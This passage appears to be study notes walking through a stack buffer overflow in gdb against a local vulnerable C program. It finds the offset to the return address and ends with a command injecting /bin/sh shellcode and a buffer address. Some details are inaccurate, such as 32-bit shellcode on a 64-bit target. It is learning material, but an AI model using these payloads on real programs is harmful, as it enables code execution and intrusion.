 called by frame at 0x7fffffffdcf0
 Arglist at 0x7fffffffdcd8, args: 
 Locals at 0x7fffffffdcd8, Previous frame's sp is 0x7fffffffdce8
 Saved registers:
  rip at 0x7fffffffdce0  
```  

We can clearly see RIP register, sent back for where the function returned is, for `foo`, to be overwritten by A's (`0x41` is `A` in hex(adecimal)).  

## Stack-based Buffer Overflows Exploitation  

cf. [Stack based buffer overflow Exploitation Tutorial By Saif El Sherei](https://www.exploit-db.com/docs/28475.pdf)
 
Empirically, `./chararr_main_bufferover $(python -c 'print "A"*264')` is ok; there was no segmentation fault, as 264 `char`'s of "A"'s.  Add further `char`'s.  

[Saif](https://www.exploit-db.com/docs/28475.pdf) explains that while we had said the buffer is supposed to be of length 256 (`char buf[256]`), but "some `gcc` implementations save memory buffer of 264, even if the source code says for only 256.  

Strategy: keep the break points found before that pinpointed where buffer overflow occurred:   
```  
(gdb) break *main+76  
(gdb) break *main+106  
```  
This time, run, and step through, and observe, with `x/100x $rsp`, changes in memory content for the addresses, *before* and *after*, especially changes where we clearly see `char`s "B"s and "C"s getting written.  

```  
(gdb) b *main+76
Breakpoint 1 at 0x4005f2: file chararr_main_bufferover.c, line 36.
(gdb) b *main+106
Breakpoint 2 at 0x400610: file chararr_main_bufferover.c, line 38.
(gdb) run $(python -c 'print "A"*264+"B"*4+"C"*4')
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/chararr_main_bufferover $(python -c 'print "A"*264+"B"*4+"C"*4')

Breakpoint 1, 0x00000000004005f2 in main (argc=2, argv=0x7fffffffdda8)
    at chararr_main_bufferover.c:36
36		 memcpy(buf, argv[1], strlen(argv[1]));
(gdb) x/100x $rsp 
0x7fffffffdbb0:	0xffffdda8	0x00007fff	0x00000000	0x00000002
0x7fffffffdbc0:	0xf7ffe6c8	0x00007fff	0xffffdbe0	0x00007fff
0x7fffffffdbd0:	0xf7b9a1a7	0x00007fff	0x6562b026	0x00000000
0x7fffffffdbe0:	0xffffffff	0x00000000	0x00000000	0x00000000
0x7fffffffdbf0:	0xf7ffa280	0x00007fff	0xf7ffe6c8	0x00007fff
0x7fffffffdc00:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc10:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc20:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc30:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc50:	0x00000000	0x00000000	0x00f0b5ff	0x00000000
0x7fffffffdc60:	0x000000c2	0x00000000	0xffffdc9f	0x00007fff
0x7fffffffdc70:	0xffffdc9e	0x00007fff	0xf7abb0f5	0x00007fff
0x7fffffffdc80:	0x00000001	0x00000000	0x0040066d	0x00000000
0x7fffffffdc90:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdca0:	0x00400620	0x00000000	0x004004b0	0x00000000
0x7fffffffdcb0:	0xffffdda0	0x00007fff	0x00000000	0x00000000
0x7fffffffdcc0:	0x00400620	0x00000000	0xf7a31431	0x00007fff
0x7fffffffdcd0:	0x00040000	0x00000000	0xffffdda8	0x00007fff
0x7fffffffdce0:	0xf7b9a188	0x00000002	0x004005a6	0x00000000
0x7fffffffdcf0:	0x00000000	0x00000000	0x2fcbb302	0xfd5004f6
0x7fffffffdd00:	0x004004b0	0x00000000	0xffffdda0	0x00007fff
0x7fffffffdd10:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdd20:	0x9a2bb302	0x02affb89	0x0459b302	0x02afeb30
0x7fffffffdd30:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) continue
Continuing.

Breakpoint 2, main (argc=2, argv=0x7fffffffdda8) at chararr_main_bufferover.c:38
38	}
(gdb) s

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400611 in main (argc=2, argv=0x7fffffffdda8) at chararr_main_bufferover.c:38
38	}
(gdb) x/100x $rsp 
0x7fffffffdcc8:	0x42424242	0x43434343	0x00040000	0x00000000
0x7fffffffdcd8:	0xffffdda8	0x00007fff	0xf7b9a188	0x00000002
0x7fffffffdce8:	0x004005a6	0x00000000	0x00000000	0x00000000
0x7fffffffdcf8:	0x2fcbb302	0xfd5004f6	0x004004b0	0x00000000
0x7fffffffdd08:	0xffffdda0	0x00007fff	0x00000000	0x00000000
0x7fffffffdd18:	0x00000000	0x00000000	0x9a2bb302	0x02affb89
0x7fffffffdd28:	0x0459b302	0x02afeb30	0x00000000	0x00000000
0x7fffffffdd38:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdd48:	0xffffddc0	0x00007fff	0xf7ffe130	0x00007fff
0x7fffffffdd58:	0xf7de7eab	0x00007fff	0x00000000	0x00000000
0x7fffffffdd68:	0x00000000	0x00000000	0x004004b0	0x00000000
0x7fffffffdd78:	0xffffdda0	0x00007fff	0x00000000	0x00000000
0x7fffffffdd88:	0x004004da	0x00000000	0xffffdd98	0x00007fff
0x7fffffffdd98:	0xf7ffdf80	0x00007fff	0x00000002	0x00000000
0x7fffffffdda8:	0xffffe0df	0x00007fff	0xffffe129	0x00007fff
0x7fffffffddb8:	0x00000000	0x00000000	0xffffe23a	0x00007fff
0x7fffffffddc8:	0xffffe245	0x00007fff	0xffffe256	0x00007fff
0x7fffffffddd8:	0xffffe275	0x00007fff	0xffffe28c	0x00007fff
0x7fffffffdde8:	0xffffe29c	0x00007fff	0xffffe2b0	0x00007fff
0x7fffffffddf8:	0xffffe2c1	0x00007fff	0xffffe2cf	0x00007fff
0x7fffffffde08:	0xffffe2e7	0x00007fff	0xffffe2f9	0x00007fff
0x7fffffffde18:	0xffffe31a	0x00007fff	0xffffe326	0x00007fff
0x7fffffffde28:	0xffffe362	0x00007fff	0xffffe9fd	0x00007fff
0x7fffffffde38:	0xffffea26	0x00007fff	0xffffea36	0x00007fff
0x7fffffffde48:	0xffffea84	0x00007fff	0xffffea8f	0x00007fff  
```  
Take a look at `0x7fffffffdcc8`.  After stepping through the `memcpy()` function, what happened is that the buffer was overwritten with 264 `char`s "A"'s, the saved frame pointer RSP was overwritten with 4 "B"'s, and return address overwritten with 4 "C"'s.  

Let's find the beginning of our buffer in memory.   Let's find where we start to "get" "A"'s written onto the register RSP.  

```   
(gdb) run $(python -c 'print "A"*272')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/chararr_main_bufferover $(python -c 'print "A"*272')

Breakpoint 1, 0x00000000004005f2 in main (argc=2, argv=0x7fffffffdda8)
    at chararr_main_bufferover.c:36
36		 memcpy(buf, argv[1], strlen(argv[1]));
(gdb) x/100x $rsp
0x7fffffffdbb0:	0xffffdda8	0x00007fff	0x00000000	0x00000002
0x7fffffffdbc0:	0xf7ffe6c8	0x00007fff	0xffffdbe0	0x00007fff
0x7fffffffdbd0:	0xf7b9a1a7	0x00007fff	0x6562b026	0x00000000
0x7fffffffdbe0:	0xffffffff	0x00000000	0x00000000	0x00000000
0x7fffffffdbf0:	0xf7ffa280	0x00007fff	0xf7ffe6c8	0x00007fff
0x7fffffffdc00:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc10:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc20:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc30:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc40:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdc50:	0x00000000	0x00000000	0x00f0b5ff	0x00000000
0x7fffffffdc60:	0x000000c2	0x00000000	0xffffdc9f	0x00007fff
0x7fffffffdc70:	0xffffdc9e	0x00007fff	0xf7abb0f5	0x00007fff
0x7fffffffdc80:	0x00000001	0x00000000	0x0040066d	0x00000000
0x7fffffffdc90:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdca0:	0x00400620	0x00000000	0x004004b0	0x00000000
0x7fffffffdcb0:	0xffffdda0	0x00007fff	0x00000000	0x00000000
0x7fffffffdcc0:	0x00400620	0x00000000	0xf7a31431	0x00007fff
0x7fffffffdcd0:	0x00040000	0x00000000	0xffffdda8	0x00007fff
0x7fffffffdce0:	0xf7b9a188	0x00000002	0x004005a6	0x00000000
0x7fffffffdcf0:	0x00000000	0x00000000	0xfc7b5b47	0x475130ee
0x7fffffffdd00:	0x004004b0	0x00000000	0xffffdda0	0x00007fff
0x7fffffffdd10:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdd20:	0x499b5b47	0xb8aecf91	0xd7e95b47	0xb8aedf28
0x7fffffffdd30:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) s
...  
(gdb) c
Continuing.

Breakpoint 2, main (argc=2, argv=0x7fffffffdda8) at chararr_main_bufferover.c:38
38	}
(gdb) x/100x $rsp
0x7fffffffdbb0:	0xffffdda8	0x00007fff	0x00000000	0x00000002
0x7fffffffdbc0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdbd0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdbe0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdbf0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc40:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc50:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc60:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc70:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc80:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc90:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdca0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdcb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdcc0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdcd0:	0x00040000	0x00000000	0xffffdda8	0x00007fff
0x7fffffffdce0:	0xf7b9a188	0x00000002	0x004005a6	0x00000000
0x7fffffffdcf0:	0x00000000	0x00000000	0xfc7b5b47	0x475130ee
0x7fffffffdd00:	0x004004b0	0x00000000	0xffffdda0	0x00007fff
0x7fffffffdd10:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdd20:	0x499b5b47	0xb8aecf91	0xd7e95b47	0xb8aedf28
0x7fffffffdd30:	0x00000000	0x00000000	0x00000000	0x00000000
```  

Clearly, it's at `0x7fffffffdbc0`.  

Then, what's left to do is to insert shell code at the return address of the function, exactly, in hexadecimal, to overwrite on the stack with:  

```  
r $(python -c 'print "A"*220+"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42"+"\xc0\xdb\xff\xff\xff\x7f"')
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/chararr_main_bufferover $(python -c 'print "A"*220+"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42"+"\xc0\xdb\xff\xff\xff\x7f"')
```  
The last part, ` +"\xc0\xdb\xff\xff\xff\x7f" ` is supposed to be the address of the start of the buffer.  Then the shell code, above, should "first" within the string of length 272, or such that the shell code will write over the return address of the function.  





